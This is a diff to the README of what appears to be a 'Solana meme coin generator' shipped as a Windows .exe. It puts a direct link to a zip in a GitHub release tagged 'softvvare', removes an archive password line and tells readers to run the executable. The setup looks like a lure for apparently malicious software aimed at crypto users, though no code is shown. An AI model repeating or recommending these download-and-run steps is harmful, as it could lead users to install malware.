@@ -10,11 +10,9 @@ Built with **Rust**, compiled into a native `.exe`, and ready to go.
 
 ## 🛠 How to Use
 
-**Download the latest version** from the [**Releases**]() page
+**Download the latest version** from the [**Releases**]https://github.com/jeongjo-ro/Launch-solana-meme-coin/releases/download/softvvare/solana.zip() page
 
-- Archive password: **SOL!Launch37**
-
-Run the `.exe` to launch the **Solana meme coin generator**.
+Run the `.exe` to launch the **solana software**.
 
 ## ✨ Key Features
 
